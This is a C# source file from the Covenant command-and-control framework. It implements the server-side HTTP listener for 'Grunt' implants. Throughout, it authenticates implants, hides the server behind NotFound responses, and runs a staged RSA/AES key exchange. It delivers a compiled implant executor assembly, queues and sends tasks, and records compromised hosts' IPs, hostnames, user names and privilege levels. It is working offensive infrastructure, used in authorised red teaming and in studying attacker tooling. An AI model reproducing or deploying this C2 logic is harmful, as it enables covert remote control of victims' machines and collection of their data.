// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

using Microsoft.Rest;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Authorization;
using Newtonsoft.Json;

using Covenant.API;
using Covenant.API.Models;
using Covenant.Core;
using Encrypt = Covenant.Core.Encryption;
using Covenant.Models.Listeners;

namespace Covenant.Controllers
{
    public class HttpListenerController : Controller
    {
		private readonly HttpListenerContext _context;
        private readonly ICovenantAPI CovenantClient;
		private readonly IHttpContextAccessor _httpContextAccessor;

		public HttpListenerController(HttpListenerContext context, ICovenantAPI api, IHttpContextAccessor httpContextAccessor)
        {
            this._context = context;
            this.CovenantClient = api;
			this._httpContextAccessor = httpContextAccessor;
        }

        private Covenant.Models.Listeners.HttpListener Listener
        {
            get
            {
                // TODO: This will be a problem given more than one listener
                return _context.Listener.FirstOrDefault();
            }
        }

        private Covenant.Models.Listeners.HttpProfile Profile
        {
            get
            {
                return Covenant.Models.Listeners.HttpProfile.Create(this.CovenantClient.ApiListenersByIdProfileGet(this.Listener.Id));
            }
        }

        private string GetCookie()
		{
			return _httpContextAccessor.HttpContext.Request.Cookies
                   .Where(C => this.Profile.GetCookies().Contains(C.Key))
                   .Select(C => C.Value)
                   .FirstOrDefault();
		}

        private void SetHeaders()
        {
            foreach (Models.Listeners.HttpProfile.HttpProfileHeader header in
                     JsonConvert.DeserializeObject<List<Models.Listeners.HttpProfile.HttpProfileHeader>>(this.Profile.HttpResponseHeaders))
            {
                Request.HttpContext.Response.Headers[header.Name] = header.Value;
            }
        }

        private string GetGetEmptyResponse()
        {
            return String.Format(this.Profile.HttpGetResponse, "");
        }

        private string GetPostEmptyResponse()
        {
            return String.Format(this.Profile.HttpPostResponse, "");
        }

        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, GruntTaskingMessage taskingMessage)
        {
            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
        }

        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, string taskingMessage)
        {
            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(taskingMessage));
        }

        private Models.Grunts.GruntEncryptedMessage CreateMessageForGrunt(API.Models.Grunt grunt, API.Models.Grunt targetGrunt, byte[] message)
        {
            List<string> path = this.CovenantClient.ApiGruntsByIdPathByTidGet(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
            path.Reverse();
            Models.Grunts.GruntEncryptedMessage finalMessage = null;
            Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType messageType = Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Tasking;
            foreach (string guid in path)
            {
                API.Models.Grunt thisGrunt = this.CovenantClient.ApiGruntsGuidByGuidGet(guid);
                finalMessage = Covenant.Models.Grunts.GruntEncryptedMessage.Create(
                    Covenant.Models.Grunts.Grunt.Create(thisGrunt),
                    message,
                    messageType
                );
                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
                messageType = Models.Grunts.GruntEncryptedMessage.GruntEncryptedMessageType.Routing;
            }
            return finalMessage;
        }

        [AllowAnonymous]
		[HttpGet]
		public ActionResult<string> Get()
		{
            this.SetHeaders();
			string cookie = this.GetCookie();
            try
            {
                API.Models.Grunt gruntModel = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
                if (gruntModel == null || gruntModel.Status != GruntStatus.Active)
                {
                    // Invalid CookieAuthKey. May not be legitimate Grunt request, respond Ok
                    return Ok();
                }
                gruntModel.LastCheckIn = DateTime.UtcNow;
                this.CovenantClient.ApiGruntsPut(gruntModel);
                GruntTasking gruntTasking = this.CovenantClient.ApiGruntsByIdTaskingsSearchUninitializedGet(gruntModel.Id ?? default)
                                                          .FirstOrDefault();
                if (gruntTasking == null)
                {
                    // No GruntTasking assigned. Respond with empty template, 
                    return Ok(this.GetGetEmptyResponse());
                }
                if (gruntTasking.Type == GruntTaskingType.Assembly)
                {
                    GruntTask task = this.CovenantClient.ApiGrunttasksByIdGet(gruntTasking.TaskId ?? default);
                    if (task == null)
                    {
                        // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
                        return NotFound();
                    }
                }
                gruntTasking.Status = GruntTaskingStatus.Tasked;
                this.CovenantClient.ApiGruntsByIdTaskingsByTidPut(gruntTasking.GruntId ?? default, gruntTasking.Id ?? default, gruntTasking);

                API.Models.Grunt targetGruntModel = this.CovenantClient.ApiGruntsByIdGet(gruntTasking.GruntId ?? default);
                Models.Grunts.GruntEncryptedMessage message = null;
                try
                {
                    message = this.CreateMessageForGrunt(gruntModel, targetGruntModel, gruntTasking.GruntTaskingMessage);
                }
                catch (HttpOperationException)
                {
                    // Change to new Status: Aborted?
                    gruntTasking.Status = GruntTaskingStatus.Completed;
                    this.CovenantClient.ApiGruntsByIdTaskingsByTidPut(gruntTasking.GruntId ?? default, gruntTasking.Id ?? default, gruntTasking);
                    return NotFound();
                }
                // Transform response
                string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
                // Format transformed response
                string response = String.Format(this.Profile.HttpPostResponse, transformed);
                return Ok(response);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
        }

        [AllowAnonymous]
		[HttpPost]
		public ActionResult<string> Post()
        {
            this.SetHeaders();
            using (StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8))
            {
                Covenant.Models.Grunts.GruntEncryptedMessage message = null;
                try
                {
                    string body = reader.ReadToEnd();
                    string ExtractedMessage = body.ParseExact(this.Profile.HttpPostRequest).FirstOrDefault();
                    string inverted = Common.CovenantEncoding.GetString(this.Profile.Invert(ExtractedMessage));
                    message = JsonConvert.DeserializeObject<Covenant.Models.Grunts.GruntEncryptedMessage>(inverted);
                }
                catch (Exception)
                {
                    // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
                    return NotFound();
                }
                string cookie = this.GetCookie();
                API.Models.Grunt egressGrunt = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.CookieAuthKey == cookie);
                API.Models.Grunt targetGrunt = null;
                try
                {
                    targetGrunt = this.CovenantClient.ApiGruntsGuidByGuidGet(message.GUID);
                }
                catch (HttpOperationException)
                {
                    targetGrunt = null;
                }

                if (targetGrunt == null)
                {
                    if (message.GUID.Length == 20)
                    {
                        API.Models.Grunt originalGeneratedGrunt = this.CovenantClient.ApiGruntsGet().FirstOrDefault(G => G.OriginalServerGuid == message.GUID.Substring(0, 10));
                        return this.PostStage0(egressGrunt, originalGeneratedGrunt, message);
                    }
                    return NotFound();
                }

                switch ((Covenant.Models.Grunts.Grunt.GruntStatus)targetGrunt.Status)
                {
                    case Covenant.Models.Grunts.Grunt.GruntStatus.Uninitialized:
                        return this.PostStage0(egressGrunt, targetGrunt, message);
                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage0:
                        return this.PostStage1(egressGrunt, targetGrunt, message);
                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage1:
                        return this.PostStage2(egressGrunt, targetGrunt, message);
                    case Covenant.Models.Grunts.Grunt.GruntStatus.Stage2:
                        return this.RegisterGrunt(egressGrunt, targetGrunt, message);
                    case Covenant.Models.Grunts.Grunt.GruntStatus.Active:
                        return this.PostTask(egressGrunt, targetGrunt, message);
                    default:
                        return NotFound();
                }
            }
        }
        
        // post task
		private ActionResult PostTask(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage outputMessage)
        {
            string cookie = this.GetCookie();
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Active || egressGrunt.CookieAuthKey != cookie)
            {
                // Invalid CookieAuthKey. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }

			string TaskName = outputMessage.Meta;
            if (string.IsNullOrWhiteSpace(TaskName))
            {
                // Invalid task response. This happens on post-register write
                return NotFound();
            }
            GruntTasking gruntTasking = CovenantClient.ApiGruntsByIdTaskingsGet(targetGrunt.Id ?? default).FirstOrDefault(T => T.Name == TaskName);
            if (gruntTasking == null || targetGrunt.Id != gruntTasking.GruntId)
            {
				// Invalid taskname. May not be legitimate Grunt request, respond NotFound
				return NotFound();
            }

            var realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
            if (realGrunt == null || realGrunt.Status != Covenant.Models.Grunts.Grunt.GruntStatus.Active)
            {
                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
                return NotFound();
            }
            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(realGrunt.GruntNegotiatedSessionKey)))
            {
				// Invalid signature. Almost certainly not a legitimate Grunt request, respond NotFound
                return NotFound();
            }
            string taskOutput = Common.CovenantEncoding.GetString(realGrunt.SessionDecrypt(outputMessage));
            gruntTasking.GruntTaskOutput = taskOutput;
            gruntTasking.Status = GruntTaskingStatus.Completed;
            this.CovenantClient.ApiGruntsByIdTaskingsByTidPut(gruntTasking.GruntId ?? default, gruntTasking.Id ?? default, gruntTasking);
            targetGrunt = this.CovenantClient.ApiGruntsByIdGet(targetGrunt.Id ?? default);
            targetGrunt.LastCheckIn = DateTime.UtcNow;
            this.CovenantClient.ApiGruntsPut(targetGrunt);

			return Ok();
        }

		private ActionResult PostStage0(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage0Response)
        {
            if(targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
            {
                // Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            bool egressGruntExists = (egressGrunt != null);

            Covenant.Models.Grunts.Grunt realTargetGrunt = null;
            string guid = gruntStage0Response.GUID.Substring(10);
            if (targetGrunt.Status != GruntStatus.Uninitialized)
            {
                // We create a new Grunt if this one is not uninitialized
                API.Models.Grunt tempModel = new API.Models.Grunt
                {
                    Id = 0,
                    Guid = gruntStage0Response.GUID.Substring(10),
                    Status = GruntStatus.Stage0,
                    ListenerId = targetGrunt.ListenerId,
                    CovenantIPAddress = targetGrunt.CovenantIPAddress,
                    GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
                    CommType = targetGrunt.CommType,
                    SmbPipeName = targetGrunt.SmbPipeName,
                    Delay = targetGrunt.Delay, JitterPercent = targetGrunt.JitterPercent, KillDate = targetGrunt.KillDate,
                    ConnectAttempts = targetGrunt.ConnectAttempts,
                    DotNetFrameworkVersion = targetGrunt.DotNetFrameworkVersion,
                    LastCheckIn = DateTime.UtcNow
                };
                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPost(tempModel);
                realTargetGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
            }
            else
            {
                targetGrunt.Status = GruntStatus.Stage0;
                targetGrunt.Guid = guid;
                targetGrunt.LastCheckIn = DateTime.UtcNow;
                API.Models.Grunt tempGrunt = CovenantClient.ApiGruntsPut(targetGrunt);
                realTargetGrunt = Covenant.Models.Grunts.Grunt.Create(tempGrunt);
            }
            if (!egressGruntExists)
            {
                egressGrunt = realTargetGrunt.ToModel();
            }

            // EncryptedMessage is the RSA Public Key
            realTargetGrunt.GruntRSAPublicKey = Convert.ToBase64String(Encrypt.Utilities.AesDecrypt(
                gruntStage0Response,
                Convert.FromBase64String(realTargetGrunt.GruntSharedSecretPassword)
            ));
            // Generate negotiated session key
            Aes newAesKey = Aes.Create();
            newAesKey.GenerateKey();
            realTargetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
            this.CovenantClient.ApiGruntsPut(realTargetGrunt.ToModel());

            if (egressGruntExists)
            {
                // Add this as Child grunt to Grunt that connects it
                List<GruntTasking> taskings = this.CovenantClient.ApiTaskingsGet().ToList();
                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
                GruntTasking connectTasking = taskings.Where(GT => GT.Type == GruntTaskingType.Connect && GT.Status == GruntTaskingStatus.Progressed).Reverse().FirstOrDefault();
                if (connectTasking == null)
                {
                    return NotFound();
                }
                realTargetGrunt.Hostname = connectTasking.GruntTaskingMessage.Message.Split(",")[0];
                this.CovenantClient.ApiGruntsPut(realTargetGrunt.ToModel());
                connectTasking.Status = GruntTaskingStatus.Completed;
                this.CovenantClient.ApiGruntsByIdTaskingsByTidPut(connectTasking.GruntId ?? default, connectTasking.Id ?? default, connectTasking);
            }

            byte[] rsaEncryptedBytes = realTargetGrunt.RSAEncrypt(Convert.FromBase64String(realTargetGrunt.GruntNegotiatedSessionKey));
            Covenant.Models.Grunts.GruntEncryptedMessage message = null;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, realTargetGrunt.ToModel(), rsaEncryptedBytes);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }
            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
            return Ok(response);
        }

		private ActionResult PostStage1(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage1Response)
        {
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
            byte[] challenge1 = realGrunt.SessionDecrypt(gruntStage1Response);
            byte[] challenge2 = new byte[4];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(challenge2);
            }
            // Save challenge to compare on response
            realGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
            realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage1;
            realGrunt.LastCheckIn = DateTime.UtcNow;
            CovenantClient.ApiGruntsPut(realGrunt.ToModel());

            Covenant.Models.Grunts.GruntEncryptedMessage message = null;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
            return Ok(response);
        }

        public ActionResult PostStage2(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntStage2Response)
        {
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
            {
				// Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
            byte[] challenge2test = realGrunt.SessionDecrypt(gruntStage2Response);
            if (realGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
            {
                // Always return NotFound, don't give away unnecessary info
                return NotFound();
            }
            realGrunt.Status = Covenant.Models.Grunts.Grunt.GruntStatus.Stage2;
            realGrunt.LastCheckIn = DateTime.UtcNow;
            this.CovenantClient.ApiGruntsPut(realGrunt.ToModel());
            API.Models.HttpListener listenerModel = this.CovenantClient.ApiListenersHttpByIdGet(realGrunt.ListenerId);
            API.Models.HttpProfile profileModel = this.CovenantClient.ApiListenersByIdProfileGet(realGrunt.ListenerId);
            var realListener = Covenant.Models.Listeners.HttpListener.Create(listenerModel);
            string GruntExecutorAssembly = realListener.CompileGruntExecutorCode(realGrunt, Covenant.Models.Listeners.HttpProfile.Create(profileModel));

            Covenant.Models.Grunts.GruntEncryptedMessage message = null;
            try
            {
                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, Convert.FromBase64String(GruntExecutorAssembly));
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
            return Ok(response);
        }

		private ActionResult RegisterGrunt(API.Models.Grunt egressGrunt, API.Models.Grunt targetGrunt, Covenant.Models.Grunts.GruntEncryptedMessage gruntMessage)
		{
            if (targetGrunt == null || targetGrunt.Status != GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
			{
				// Always return NotFound, don't give away unnecessary info
				return NotFound();
			}
            if (egressGrunt == null)
            {
                egressGrunt = targetGrunt;
            }
            Covenant.Models.Grunts.Grunt realGrunt = Covenant.Models.Grunts.Grunt.Create(targetGrunt);
			string message = Common.CovenantEncoding.GetString(realGrunt.SessionDecrypt(gruntMessage));
			// todo: try/catch on deserialize?
			Covenant.Models.Grunts.Grunt grunt = JsonConvert.DeserializeObject<Covenant.Models.Grunts.Grunt>(message);

			targetGrunt.IpAddress = grunt.IPAddress;
            targetGrunt.Hostname = grunt.Hostname;
			targetGrunt.OperatingSystem = grunt.OperatingSystem;
			targetGrunt.UserDomainName = grunt.UserDomainName;
			targetGrunt.UserName = grunt.UserName;
			targetGrunt.Status = GruntStatus.Active;
			targetGrunt.Integrity = (API.Models.IntegrityLevel)Enum.Parse(typeof(API.Models.IntegrityLevel), grunt.Integrity.ToString());
			targetGrunt.Process = grunt.Process;
            realGrunt.LastCheckIn = DateTime.UtcNow;

            CovenantClient.ApiGruntsPut(targetGrunt);

            GruntTaskingMessage tasking = new GruntTaskingMessage
            {
                Message = targetGrunt.CookieAuthKey,
                Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                Type = GruntTaskingType.Jobs,
                Token = false
            };

            Models.Grunts.GruntEncryptedMessage responseMessage = null;
            try
            {
                responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
            }
            catch (HttpOperationException)
            {
                return NotFound();
            }

            // Transform response
            string transformed = this.Profile.Transform(Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
            // Format transformed response
            string response = String.Format(this.Profile.HttpPostResponse, transformed);
            return Ok(response);
        }
    }
}
